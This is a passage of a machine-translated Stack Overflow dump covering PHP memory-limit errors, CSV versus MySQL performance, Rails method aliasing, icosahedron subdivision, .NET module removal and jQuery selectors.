我能问一下你为什么要提出这么多要求吗？浏览器限制对同一域的请求数量是有充分理由的。如果可能的话，你会更好地捆绑请求。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-12-01T22:07:55.030

迁移到 http 2.0 的一个很好的理由

使用 http2.0，每台主机的最大连接数实际上是无限的：[HTTP/2 是否提高了每台主机的连接数限制？](https://stackoverflow.com/questions/36835972/is-the-per-host-connection-limit-raised-with-http-2)

# php - CSV 与 MySQL 的性能

> ID：561058
> 
> 赞同：9
> 
> 时间：2009-02-18T13:31:57.967
> 
> 标签：php, mysql, performance, csv

让我们假设 PHP5 使用 MySQL5 和 CSV 文件的相同环境。MySQL 与托管脚本位于同一主机上。

MySQL 总是比检索/搜索/更改/添加/删除记录到 CSV 更快吗？

或者是否有一些数据低于 PHP+CSV 的性能比使用数据库服务器更好？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-02-18T13:41:37.413

`CSV`不会让您为快速搜索创建索引。

如果您总是需要单个表中的所有数据（例如 for `application settings`），`CSV`则速度更快，否则不需要。

我什至不考虑`SQL queries`, `transactions`, `data manipulation`or `concurrent access`here，因为`CSV`这些东西肯定不是。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-02-18T13:51:29.247

不，MySQL 的插入（附加到 CSV 非常快）和表扫描（非基于索引）搜索可能会更慢。

从 CSV 更新或删除并非易事——我将其留给读者作为练习。

如果您使用 CSV，则需要非常小心地正确处理多个线程/进程，否则您将获得错误数据或损坏文件。

但是，还有其他优点。想知道如何在 CSV 上执行 ALTER TABLE 吗？

如果您需要 UPDATE、DELETE、ALTER TABLE 或同时从多个进程访问文件，则使用 CSV 是一个非常糟糕的主意。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-02-18T14:05:56.183

作为一个来自数据行业的人，我已经处理过这种情况。

**一般来说，MySQL 会更快。**

但是，您没有说明您正在开发的应用程序的类型。您是否正在开发一个主要用于搜索和检索记录的数据仓库应用程序？您的记录中通常有多少字段？您的数据文件中通常有多少条记录？这些文件之间是否有任何关系属性，即您有客户文件和客户订单文件吗？你有多少时间来开发一个系统？

答案将取决于前面列出的问题的答案。但是，您通常可以使用以下内容作为指导：

如果您正在构建一个记录超过一百万的数据仓库应用程序，您可能需要考虑放弃两者并迁移到[面向列的数据库](http://en.wikipedia.org/wiki/Column-oriented_DBMS)。

对于较小的数据集，CSV 可能会更快。但是，在 CSV 中滚动您自己的插入例程可能会很痛苦，并且您会失去数据库索引的优势。

我的一般建议是只使用 MySql，正如我之前所说，在大多数情况下它会更快。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T14:06:21.893

正如@MarkR 所说，从纯粹的性能角度来看，它完全取决于您正在执行的操作。附加到平面文件非常快。与读取整个文件一样（用于非索引搜索或其他目的）。

确定什么对您的平台上的用例更有效的唯一方法是进行实际分析。我可以向你保证，对一百万行数据库进行全表扫描会比`grep`一百万行 CSV 文件慢。但这可能不是您使用的实际示例。“断点”将根据您对检索、索引搜索、非索引搜索、更新、追加的特定组合而有很大差异。

对我来说，这不是性能问题。您的数据听起来是面向记录的，而 MySQL 在处理此类数据方面（一般而言）非常出色。如果您的用例在您的数据变大时甚至有点复杂，那么与 100k 记录 db 表相比，处理 100k 行 CSV 文件将是可怕的，即使性能稍微好一点（这是绝对没有的）意味着保证）。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-19T13:16:15.047

取决于用途。例如，对于配置或语言文件，CSV 可能会做得更好。无论如何，如果你使用 PHP5，你有第三个选项——SQLite，它嵌入在 PHP 中。它使您像常规文件一样易于使用，但具有 RDBMS 的健壮性。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-18T13:43:18.610

数据库用于存储和检索数据。如果您需要的不仅仅是简单的行/条目添加或批量列表，为什么不采用数据库方式呢？否则，您基本上必须自己编写功能（包括删除、排序等）。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-18T13:47:35.637

CSV 是一种非常脆弱的格式，需要您的应用程序进行所有格式化和计算。如果您需要更新 csv 中的特定记录，您必须首先读取整个 csv 文件，找到内存中需要更改的条目，然后再次将整个文件写出。这会很快变得非常缓慢。CSV 仅适用于一次写入、一次读取类型的应用程序。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-09-27T09:53:13.307

如果你想在夜间像小偷一样快速导入，请使用 SQL 格式。

如果您在生产服务器中工作，CSV 速度很慢，但它是最安全的。

只需确保 CSV 文件没有会覆盖现有数据的主键。

# php - 致命错误：已用尽 134217728 字节的允许内存大小（CodeIgniter + XML-RPC）

> ID：561066
> 
> 赞同：705
> 
> 时间：2009-02-18T13:33:44.047
> 
> 标签：php, codeigniter, memory, xml-rpc, memory-limit

我有一堆客户销售点 (POS) 系统，它们定期将新的销售数据发送到一个中央数据库，该数据库将数据存储到一个大数据库中以生成报告。

客户端 POS 基于 PHPPOS，并且我已经实现了一个使用标准 XML-RPC 库将销售数据发送到服务的模块。服务器系统建立在 CodeIgniter 之上，并使用 XML-RPC 和 XML-RPCS 库作为 Web 服务组件。每当我发送大量销售数据（销售表中少至 50 行，以及与销售中的每个项目相关的 sales_items 中的各个行）时，我都会收到以下错误：

```
Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 54 bytes) 
```

128M 是 中的默认值`php.ini`，但我认为这是一个很大的数字。事实上，我什至尝试过将此值设置为 1024M，但它所做的只是需要更长的时间才能出错。

至于我采取的步骤，我尝试禁用服务器端的所有处理，并操纵它以返回预设响应，无论输入如何。但是，我认为问题在于数据的实际发送。我什至尝试禁用 PHP 的最大脚本执行时间，但它仍然出错。

* * *

## 回答 #1

> 赞同：782
> 
> 时间：2013-09-06T14:24:11.737

更改`memory_limit`by`ini_set('memory_limit', '-1');`不是一个适当的解决方案**。**请不要那样做。

您的 PHP 代码可能在某处存在内存泄漏，而您正在告诉服务器只使用它想要的所有内存。你根本不会解决问题。如果您监视您的服务器，您会发现它现在可能正在使用大部分 RAM，甚至交换到磁盘。

您可能应该尝试追踪代码中的违规代码并修复它。

* * *

## 回答 #2

> 赞同：218
> 
> 时间：2011-10-25T20:42:44.633

`ini_set('memory_limit', '-1');`覆盖默认的[PHP 内存限制](http://php.net/memory_limit)。

* * *

## 回答 #3

> 赞同：149
> 
> 时间：2013-03-21T07:29:08.153

正确的方法是编辑您的`php.ini`文件。编辑`memory_limit`您想要的值。

从您的问题来看，`128M`（这是默认限制）已超出，因此您的代码存在严重问题，因为它不应该占用那么多。

如果你知道为什么它需要这么多，并且你想让它设置`memory_limit = 512M`或更高，那么你应该很好。

* * *

## 回答 #4

> 赞同：106
> 
> 时间：2014-03-09T14:55:54.870

PHP 的内存分配可以永久或临时调整。

## 永久

您可以通过两种方式永久更改 PHP 内存分配。

如果您有权访问您的`php.ini`文件，则可以将值编辑为`memory_limit`您想要的值。

如果您无权访问您的`php.ini`文件（并且您的虚拟主机允许），您可以通过`.htaccess`文件覆盖内存分配。添加`php_value memory_limit 128M`（或任何您想要的分配）。

## 暂时的

您可以在 PHP 文件中动态调整内存分配。您只需拥有代码`ini_set('memory_limit', '128M');`（或任何您想要的分配）。您可以通过将值设置为“-1”来移除内存限制（尽管机器或实例限制可能仍然适用）。

* * *

## 回答 #5

> 赞同：65
> 
> 时间：2009-02-18T14:42:12.133

在 PHP 脚本中很容易出现内存泄漏 - 特别是如果您使用抽象，例如 ORM。尝试使用 Xdebug 分析您的脚本并找出所有内存的去向。

* * *

## 回答 #6

> 赞同：58
> 
> 时间：2015-06-28T05:19:31.373

当使用 array_push 将 2250 万条记录添加到数组中时，我一直在使用`4G`php.ini 文件中的内存限制在大约 20M 条记录时出现“内存耗尽”致命错误。为了解决这个问题，我添加了语句

```
$old = ini_set('memory_limit', '8192M'); 
```

在文件的顶部。现在一切正常。我不知道 PHP 是否有内存泄漏。那不是我的工作，我也不在乎。我只需要完成我的工作，这很奏效。

该程序非常简单：

```
$fh = fopen($myfile);
while (!feof($fh)) {
    array_push($file, stripslashes(fgets($fh)));
}
fclose($fh); 
```

致命错误指向第 3 行，直到我提高了内存限制，从而消除了错误。

* * *

## 回答 #7

> 赞同：48
> 
> 时间：2017-03-13T11:26:16.090

即使使用`memory_limit`set in `php.ini`，并且使用 正确读取值，我也不断收到此错误`phpinfo()`。

通过改变它：

```
memory_limit=4G 
```

对此：

```
memory_limit=4096M 
```

这纠正了 PHP 7 中的问题。

* * *

## 回答 #8

> 赞同：24
> 
> 时间：2015-05-08T20:09:58.490

当您看到上述错误时 - 特别是如果`(tried to allocate __ bytes)`是一个低值，这可能是一个无限循环的指标，就像一个没有出路的函数调用自己：

```
function exhaustYourBytes()
{
    return exhaustYourBytes();
} 
```

* * *

## 回答 #9

> 赞同：22
> 
> 时间：2015-04-22T12:41:23.617

您可以通过更改`memory_limit`fastcgi/fpm 来正确解决此问题：

```
$vim /etc/php5/fpm/php.ini 
```

更改内存，例如从 128 到 512，见下文

```
; Maximum amount of memory a script may consume (128 MB)
; http://php.net/memory-limit
memory_limit = 128M 
```

至

```
; Maximum amount of memory a script may consume (128 MB)
; http://php.net/memory-limit
memory_limit = 512M 
```

* * *

## 回答 #10

> 赞同：21
> 
> 时间：2015-01-22T12:46:36.160

**您网站的根目录：**

```
ini_set('memory_limit', '1024M'); 
```

* * *

## 回答 #11

> 赞同：19
> 
> 时间：2013-12-05T06:19:57.113

启用这两行后，它开始工作：

```
; Determines the size of the realpath cache to be used by PHP. This value should
; be increased on systems where PHP opens many files to reflect the quantity of
; the file operations performed.
; http://php.net/realpath-cache-size
realpath_cache_size = 16k

; Duration of time, in seconds for which to cache realpath information for a given
; file or directory. For systems with rarely changing files, consider increasing this
; value.
; http://php.net/realpath-cache-ttl
realpath_cache_ttl = 120 
```

![](https://content.screencast.com/users/PKMauyra/folders/Jing/media/8afa91fd-d7da-4e62-86f4-571e457e1bf9/2013-12-05_1120.png)

* * *

## 回答 #12

> 赞同：14
> 
> 时间：2018-02-07T12:21:16.537

与其更改文件中的`memory_limit`值`php.ini`，如果您的代码的一部分可能使用大量内存，您可以`memory_limit`在该部分运行之前删除它，然后在之后替换它。

```
$limit = ini_get('memory_limit');
ini_set('memory_limit', -1);
// ... do heavy stuff
ini_set('memory_limit', $limit); 
```

* * *

## 回答 #13

> 赞同：13
> 
> 时间：2013-02-25T17:52:45.770

在 Drupal 7 中，您可以修改位于您的站点/默认文件夹中的 settings.php 文件中的内存限制。在第 260 行附近，您将看到：

```
ini_set('memory_limit', '128M'); 
```

即使您的 php.ini 设置足够高，如果您的 Drupal settings.php 文件中没有设置，您也无法消耗超过 128 MB。

* * *

## 回答 #14

> 赞同：13
> 
> 时间：2019-05-10T11:09:13.383

只需`ini_set('memory_limit', '-1');`在网页顶部添加一行。

您可以根据需要在 -1、to`16M`等位置设置内存。

* * *

## 回答 #15

> 赞同：12
> 
> 时间：2018-06-26T05:20:19.900

更改**php.ini**文件中的内存限制并重新启动 Apache。重启后，运行**phpinfo();** 来自任何 PHP 文件的函数以进行`memory_limit`更改确认。

```
memory_limit = -1 
```

内存限制 -1 表示没有设置内存限制。现在是最大值。

* * *

## 回答 #16

> 赞同：11
> 
> 时间：2012-12-06T17:48:48.603

对于 Drupal 用户，这个 Chris Lane 的回答是：

```
ini_set('memory_limit', '-1'); 
```

有效，但我们需要在开幕式之后放置

```
<?php 
```

站点根目录中 index.php 文件中的标记。

* * *

## 回答 #17

> 赞同：7
> 
> 时间：2013-10-15T13:44:17.170

PHP 5.3+ 允许您通过在文件夹中放置`.user.ini`文件来更改内存限制`public_html`。只需创建上述文件并在其中键入以下行：

```
memory_limit = 64M 
```

一些 cPanel 主机只接受这种方法。

* * *

## 回答 #18

> 赞同：7
> 
> 时间：2016-12-29T14:13:26.633

**崩溃页面？**

[![在此处输入图像描述](https://i.stack.imgur.com/a2IyM.png)](https://i.stack.imgur.com/a2IyM.png)

（当 MySQL 必须查询大行时会发生这种情况。默认情况下，`memory_limit`设置为 small，这对硬件来说更安全。）

您可以在增加之前检查系统现有内存状态`php.ini`：

```
# free -m
             total       used       free     shared    buffers     cached
Mem:         64457      63791        666          0       1118      18273
-/+ buffers/cache:      44398      20058
Swap:         1021          0       1021 
```

在这里，我将其增加如下，然后`service httpd restart`修复崩溃页面问题。

```
# grep memory_limit /etc/php.ini
memory_limit = 512M 
```

* * *

## 回答 #19

> 赞同：6
> 
> 时间：2015-07-12T20:40:35.623

对于那些挠头想知道为什么这个小函数会导致内存泄漏的人，有时由于一个小错误，一个函数开始递归地永远调用自己。

例如，一个代理类与将要代理它的对象的函数具有相同的名称。

```
class Proxy {

    private $actualObject;

    public function doSomething() {

        return $this->actualObjec->doSomething();
    }
} 
```

有时你可能会忘记带上那个小实际对象成员，因为代理实际上有那个`doSomething`方法，PHP 不会给你任何错误，对于一个大类，它可能会被隐藏几分钟以找出原因正在泄漏内存。

* * *

## 回答 #20

> 赞同：6
> 
> 时间：2017-01-30T11:56:16.263

在比以前工作的数据集更小的数据集上运行时，我遇到了以下错误。

> 致命错误：第 173 行 C:\workspace\image_management.php 中允许的内存大小为 134217728 字节已用尽（尝试分配 4096 字节）

由于寻找故障将我带到这里，我想我会提到它并不总是以前答案中的技术解决方案，而是更简单的东西。就我而言，它是 Firefox。在我运行该程序之前，它已经使用了 1,157 MB。

事实证明，在几天的时间里，我一次只看一段 50 分钟的视频，结果把事情搞砸了。这是专家在没有考虑的情况下纠正的那种修复，但对于我这样的人来说，这是值得牢记的。

* * *

## 回答 #21

> 赞同：3
> 
> 时间：2019-06-06T11:01:54.707

使用`yield`也可能是一种解决方案。请参阅*[生成器语法](https://www.php.net/manual/en/language.generators.syntax.php)*。

而不是更改`PHP.ini`文件以获得更大的内存存储，有时实现`yield`内部循环可能会解决问题。yield 所做的不是一次转储所有数据，而是一一读取，节省大量内存使用。

* * *

## 回答 #22

> 赞同：2
> 
> 时间：2015-06-24T15:14:16.843

如果您运行的是 WHM 驱动的 VPS（虚拟专用服务器），您可能会发现您没有权限直接编辑 PHP.INI；系统必须这样做。在 WHM 主机控制面板中，转到*Service Configuration* → *PHP Configuration Editor*并修改`memory_limit`：

![在 WHM 11.48.4 上更新 memory_limit](https://i.stack.imgur.com/kewYS.png)

* * *

## 回答 #23

> 赞同：2
> 
> 时间：2016-02-22T09:48:32.363

像这样运行脚本（例如 cron 案例）：`php5 /pathToScript/info.php`产生相同的错误。

正确的方法：`php5 -cli /pathToScript/info.php`

* * *

## 回答 #24

> 赞同：2
> 
> 时间：2015-08-15T19:13:26.113

`_dbconnection.php_`我发现在实际处理的文件中包含或要求和时，它很有用`_functions.php`，而不是包含在标题中。它本身就包含在内。

因此，如果包含**页眉**和**页脚**，只需在包含页眉之前包含所有功能文件。

* * *

## 回答 #25

> 赞同：2
> 
> 时间：2021-01-21T00:27:08.737

在我的 mac (Catalina - Xampp) 上，没有加载文件，所以我必须先这样做。

```
sudo cp /etc/php.ini.default /etc/php.ini
sudo nano /etc/php.ini 
```

然后改变`memory_limit = 512M`

然后重新启动Apache并检查文件是否加载

```
php -i | grep php.ini 
```

结果是

```
Configuration File (php.ini) Path => /etc
Loaded Configuration File => /etc/php.ini 
```

最后检查

```
php -r "echo ini_get('memory_limit').PHP_EOL;" 
```

* * *

## 回答 #26

> 赞同：1
> 
> 时间：2019-07-16T15:37:45.860

对我来说，此错误消息的最常见原因是在 PHP“for”语句中省略了“++”运算符。无论您允许使用多少内存，这都会导致循环永远继续。这是一个简单的语法错误，但编译器或运行时系统很难检测到。如果我们想寻找它，我们很容易纠正！

但是，假设您想要一个提前停止此类循环并报告错误的通用过程？您可以简单地检测每个循环（或至少是最内层的循环），如下所述。

在某些情况下，例如异常内的递归，`set_time_limit`失败，并且浏览器不断尝试加载 PHP 输出，无论是无限循环还是致命错误消息，这是本问题的主题。

通过减少代码开头附近允许的分配大小，您可以防止致命错误，如其他答案中所述。

然后你可能会留下一个终止​​的程序，但仍然难以调试。

无论您的程序是否终止，通过`BreakLoop()`在程序中插入调用来检测您的代码以获得控制权并找出程序中的循环或递归导致问题。

BreakLoop的定义如下：

```
function BreakLoop($MaxRepetitions=500,$LoopSite="unspecified")
    {
    static $Sites=[];
    if (!@$Sites[$LoopSite] || !$MaxRepetitions)
        $Sites[$LoopSite]=['n'=>0, 'if'=>0];
    if (!$MaxRepetitions)
        return;
    if (++$Sites[$LoopSite]['n'] >= $MaxRepetitions)
        {
        $S=debug_backtrace(); // array_reverse
        $info=$S[0];
        $File=$info['file'];
        $Line=$info['line'];
        exit("*** Loop for site $LoopSite was interrupted after $MaxRepetitions repetitions. In file $File at line $Line.");
        }
    } // BreakLoop 
```

$LoopSite 参数可以是代码中函数的名称。这不是必需的，因为您将收到的错误消息会将您指向包含 BreakLoop() 调用的行。

* * *

## 回答 #27

> 赞同：1
> 
> 时间：2020-09-13T08:50:40.457

更改`;memory_limit=512M` 为`;memory_limit=-1` _ [![在此处输入图像描述](https://i.stack.imgur.com/WaUHE.png)](https://i.stack.imgur.com/WaUHE.png)

这对服务器来说太危险了 您的 PHP 代码可能在某处存在内存泄漏，而您正在告诉服务器只使用它想要的所有内存。你根本不会解决问题。如果您监视您的服务器，您会发现它现在可能正在使用大部分 RAM，甚至交换到磁盘。

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2021-09-08T15:48:29.667

就我而言，它本身就是一个完整的磁盘和mysql shat。

在释放磁盘空间、修复数据库并重新启动 Apache 之后，我的网站又可以正常工作了！

一些路过的孩子设法淹没了我的日志并填满了我留在虚拟机上的稀缺的 500 多字节。:D

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2020-11-11T02:11:15.783

我花了两个时间寻找解决方案，我发现这是我打电话时与 PDO 通话的原因

```
$stmt->bindParam(":PERIOD", $period); 
```

变量周期是

```
empty string '' 
```

所以这个问题可能有多个根本原因，我对你的建议是尝试反复试验或二分法来寻找根本原因，删除代码并尝试搜索失败的行代码

更新：我使用 $pdo->query() 方法也遇到了这个错误我使用了 $pdo->prepare() 并且运行良好，所以，虽然我有

```
$sql = "SELECT * FROM COURSE_DETAILS where ACTIVE = 1 AND COURSE_DETAILS_ID = $id";
$stmt = getConnection()->query($sql);
$courseDetails = $stmt->fetchAll(PDO::FETCH_ASSOC) 
```

然后我把它改成

```
$sql = "SELECT * FROM COURSE_DETAILS where ACTIVE = 1 AND COURSE_DETAILS_ID = ?";
$stmt = getConnection()->prepare($sql);
$stmt->execute(array($id)); 
```

神奇地内存错误消失了！

* * *

## 回答 #30

> 赞同：0
> 
> 时间：2021-05-01T11:35:31.773

这个问题是几年前问的，所以虽然我的事实不一样，但我最近在循环解析服务器上的html表时也收到了这个错误。错误的原因是因为 html 是使用连接到变量的双引号解析的`$table`，同时在多行上连接字符串。

```
$table = "<table>\n";
    $table .= "<tbody>\n";
        foreach ($data as $item) {
            $table .= "<tr>\n";
                // this caused the Fatal Error: Allowed Memory Size of 134217728 Bytes Exhausted
                $table .= "<td>$item->description</td><td>$item->qty</td>" .  
                $table .= "<td>$item->price_incl</td><td>$item->price->vat</td>" .
                $table .= "<td>$item->price_excl</td><td>$item->available</td>" .
            $table .= "</tr>\n";
        }
    $table .= "</tbody>";
$table .= "</table>\n"; 
```

上面的错误对我来说很奇怪，但考虑到我已经将字符串连接到`$table`变量，现在我尝试过这个似乎很愚蠢。解决方案是删除第 7 行和第 8 行的变量连接或删除第 6、7 和 8 行的结束连接符号。

* * *

## 回答 #31

> 赞同：0
> 
> 时间：2019-03-18T14:55:51.487

就我而言，这是编写函数方式的一个简短问题。为函数的输入变量分配新值可能会导致内存泄漏，例如：

```
/**
* Memory leak function that illustrates unintentional bad code
* @param $variable - input function that will be assigned a new value
* @return null
**/
function doSomehting($variable){
    $variable = 'set value';
    // Or
    $variable .= 'set value';
} 
```

* * *

## 回答 #32

> 赞同：-7
> 
> 时间：2015-02-11T08:13:22.983

当我从代码中删除以下行时，一切正常！

```
set_include_path(get_include_path() . get_include_path() . '/phpseclib');
include_once('Net/SSH2.php');
include_once('Net/SFTP.php'); 
```

这些行包含在我正在运行的每个文件中。逐个运行文件时，一切正常，但是当一起运行所有文件时，我遇到了内存泄漏问题。不知何故，“include_once”不包括一次，或者我做错了什么......

# ruby-on-rails - 如何在 Rails 插件中动态地为 ActiveRecord 类方法命名？

> ID：561074
> 
> 赞同：1
> 
> 时间：2009-02-18T13:36:38.143
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-plugins

我无法删除我在 rails 插件中引入的一些重复项。

下面的代码以相同的方式修改了 ActiveRecord 的 find 和 calculate 方法，但我一直无法删除重复项。

下面的 find 和 calculate 方法使用了 super 关键字，这是一个障碍，因为 super 关键字只能用于调用与调用方法同名的方法，所以我不能将 super 关键字移动到共享的方法通过查找和计算。

所以接下来我尝试对超类 ActiveRecord 中的 find 和 calculate 类方法进行别名处理，但是，我无法获得别名的正确语法。如果有人可以告诉我，那将是一个很大的帮助。

如果您有更好的方法来完全做到这一点，我也希望您也发布它。

下面我对代码进行了一些精简以突出问题：

```
module Geocodable #:nodoc:

  def self.included(mod)
    mod.extend(ClassMethods)
  end

  module ClassMethods
    def acts_as_geocodable(options = {})
      extend Geocodable::SingletonMethods
    end
  end

  module SingletonMethods

    def find(*args)
      some_method_1
      super *args.push(options)
      some_method_2
    end

    # TODO: Remove duplication of find above and calculate below.

    def calculate(*args)
      some_method_1
      super *args.push(options)
      some_method_2
    end
  end
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T14:20:22.607

重构此代码的最佳方法是保持不变，`find`并`calculate`使用类级函数添加应用包装。

这是粗略的草图，没有您的模块和混合逻辑：

```
class A
  def find x
    puts 'finding'
  end

  def calculate x
    puts 'calculating'
  end
end

class B < A
  def self.make_wrapper_method name
    define_method name do |*args|
      puts "entering"
      result = super *args
      puts "exiting"
      result
    end
  end

  make_wrapper_method :find
  make_wrapper_method :calculate
end 
```

请注意，如果`B`已经覆盖`find`或，则需要对其进行修改`calculate`。

要使用此代码，首先使您的版本正常工作，然后将其修改为使用`define_method`. （如果您需要极高的性能，您可能需要使用其中一个`*_eval`函数来创建包装器而不是`define_method`.）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-26T07:42:29.333

这是我最终选择的选项，感谢 emk 的指导以达到这一点！

```
module Geocodable

  def self.included(mod)
    mod.extend(ClassMethods)
  end

  module ClassMethods
    def acts_as_geocodable(options = {})
      geoify_query_methods
    end

    private
      # This is where the duplication has been removed
      def geoify_query_methods
        class << self
          [:calculate, :find].each do |method_name|
            define_method method_name do |*args|
              some_method_1
              super *args.push(options)
              some_method_2
            end
          end
        end
      end

  end
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-19T11:12:41.990

只是别名 find 方法：

```
module SingletonMethods
  def find(*args)
    some_method_1
    super *args.push(options)
    some_method_2
  end
  alias :calculate :find
end 
```

# algorithm - 如何生成细分的二十面体？

> ID：561093
> 
> 赞同：9
> 
> 时间：2009-02-18T13:47:04.637
> 
> 标签：algorithm, math, geometry

我在这里问了一些问题，并且在其他测地线形状中多次提到过这个几何形状，但我很好奇我将如何准确地生成一个关于点 xyz 的几何形状？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-02-18T13:50:20.183

[这里](http://www.donhavey.com/blog/tutorials/tutorial-3-the-icosahedron-sphere/)有教程。

基本思想是从一个二十面体（有 20 个三角形面）开始，然后将每个三角形面反复细分为更小的三角形。在每个阶段，每个新点都会径向移动，因此它与中心的距离是正确的。

阶段的数量将决定生成多少个三角形，从而确定生成的网格与球体的接近程度。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-02-18T13:55:54.447

[这](http://www.opengl.org.ru/docs/pg/0208.html)是我用于细分二十面体的一个参考，基于 OpenGL 红皮书。我的 iPhone 应用程序[Molecules](http://www.sunsetlakesoftware.com/molecules)的 BSD 许可[源代码](http://www.sunsetlakesoftware.com/2008/10/02/molecules-source-code-now-available)包含用于生成简单二十面体并将它们加载到 OpenGL ES 的顶点缓冲区对象中的代码。我还没有合并细分来提高渲染质量，但它在我的计划中。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2011-03-18T12:04:16.050

为了细分球体，大多数人将点线性细分，但这不会产生圆形。

对于圆形镶嵌，通过一系列旋转旋转两个点。

1.  将第二个点绕 z 旋转（按点 1 的 z 角）到 0
2.  围绕 y 旋转第二个点（通过点 1 的 y 角）到 0（这在逻辑上将点 1 置于北极）。
3.  将围绕 z 的第二个点旋转到 0（这在逻辑上将点 1 放在 x/y 平面上，现在变成单位圆）。
4.  求半角，计算新的第 3 点，即第 3 点的 x 和 y。
5.  以相反的顺序执行步骤 3)、2) 和 1) 的反向旋转，以将第 3 个点定位到其目的地。

对于每个接近 0 的位置附近的值也有一些数学考虑，例如北极和南极，最右边和最左边，最前面和最后面的位置，所以首先检查这些和如果它们在这些位置，则执行 pi/4（45 度）的额外旋转。这可以防止浮点数学库出现异常并为 atan2() 和其他 trig 函数生成大量不合字符的值。

希望这可以帮助！:-)

# asp.net - 通过不发送 .dll 来禁用程序中的模块

> ID：561098
> 
> 赞同：1
> 
> 时间：2009-02-18T13:47:57.693
> 
> 标签：asp.net, assemblies

如果您分发 .net Web 应用程序，并且您希望禁用该应用程序的某个模块，并且您不想随它一起提供源代码，那么不包含必要的 .dll 是否是一个合理的解决方案模块？

我知道你可以以编程方式做事，但只要你不发送 .dll 事情应该没问题吧？

原因是某些 .dll 要求您在商业上销售该产品，如果我想免费赠送或作为演示，我会被卡住。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-05T00:02:19.460

一种可能的方法（假设您不想或不能使用插件路线）是创建一个虚拟 DLL，其中包含所有相同的类和方法，但实际上并没有做任何事情。

根据 DLL 的大小和复杂性，这可能是也可能不是可行的操作。

插件路由将是我处理它的方式，因为每当“真实” DLL 更改时，您都需要更新您的虚拟 DLL。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T13:52:00.493

你必须去插件架构。这里有很多[关于 SO](https://stackoverflow.com/search?q=plugin+.net)的问题，以及将在 Visual Studio 2010 中使用的[MEF](http://www.codeplex.com/MEF)，以及有助于创建基于插件的应用程序的大量 DI/IoC 容器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T13:53:41.300

只要您交付的二进制映像实际上不需要您未交付的 dll 中的任何内容，您就应该没问题。这包括“不公开丢失的 dll 提供的功能”。

例如; 如果您的 pdf 工具未“安装”，请不要显示“下载为 pdf”按钮。

我之前通过使用一种插件系统来完成此操作，该系统扫描预定义目录中的 .dll 并构建实现某个接口的所有公开类的列表。不过，对于您想要的东西可能有点矫枉过正，而且与您的建议相反。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-19T05:36:18.100

如果您使用的是网站而不是 Web 应用程序项目，这肯定会中断，因为 DLL 引用必须在您的 web.config 中...当它丢失时会引发错误。

您可以在 Web 应用程序项目中摆脱它，但这是一种非常丑陋的方法。正如其他人所建议的那样，使用某种插件架构要好得多。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-18T13:55:35.257

您肯定需要某种“代码中”元素，因为缺少 DLL 会比简单地禁用您想要的模块更糟糕。

# jquery - 使用 jQuery 对两个列表进行分类

> ID：561102
> 
> 赞同：0
> 
> 时间：2009-02-18T13:49:01.530
> 
> 标签：jquery, list

我正在使用 jQuery。现在我需要对这两个列表进行分类。如果任何具有 Id 的列表以外部开头，我需要将其提醒为“外部”。如果任何具有 Id 的列表以 sub 开头，我需要将其提醒为“Sub”。

```
<ul id="nav">
     <li id="outer1"><a href="#url"><b class="">Outer 1</b></a></li>
     <li id="outer2"><a href="#url"><b class="">Outer 2</b></a></li>

     <li id="outer3"><a href="#url"><b class="">Outer 3  </b></a>
          <ul style="display: none;">
             <li id="sub1"><a href="#url"><span id="inner1"> inner1</span></a></li>
             <li id="sub2"><a href="#url"><span id="inner2"> inner2</span></a></li>

         </ul>
     </li>
     <li id="outer4"><a href="#url"><b class="">Outer 3  </b></a></li>
</ul> 
```

我的代码如下。我完成了以下代码。

```
$("li").each(function(){
      $( "li[ @id ^= 'start' ]" )
           alert("START");
        $( "li[ @id ^= 'sub' ]" )
           alert("SUB");
 }); 
```

为了正确执行，我应该进行哪些更改？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T13:58:43.517

如果您只想区分第一级和第二级列表项，您也可以简单地将**$("li li")**用于第二级，将**$("li:not(li li)")**用于第一级（未测试）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T14:01:22.450

```
$("li").each(function()
{ 
    if($(this).is("[id^='start']")) alert("START");
    else if($(this).is("[id^='sub']")) alert("SUB");
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T13:57:56.470

```
$("li").each(function(){ 
    $( "li[ @id ^= 'start' ]" ) 
```

在`each`循环中，您必须使用`this`关键字。所以，每一个`LI`都是`this`。对于你想要做什么，如果我是你，我会这样做：

```
$("li").each(function(){ 
    $(this).is('[id^=start]')
}) 
```

但是，我想你最好重新考虑一下你的理由。因为我不认为你会需要所有这些`ID`。要选择 的第一级`LI`，您可以使用以下命令：

```
$('ul > li') 
```

然后，对于下一个级别，您可以使用

```
$('ul > ul > li') 
```

等等。

# jquery - 解除绑定，然后绑定不起作用

> ID：561104
> 
> 赞同：-1
> 
> 时间：2009-02-18T13:49:54.960
> 
> 标签：jquery

我有一个执行以下操作的函数：

1.  将页面上的所有图像绑定到单击处理程序。
2.  单击时，取消绑定然后发出 ajax 请求
3.  再次绑定链接。

从理论上讲，这应该正确吗？（对不起，我没有代码）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T14:51:37.603

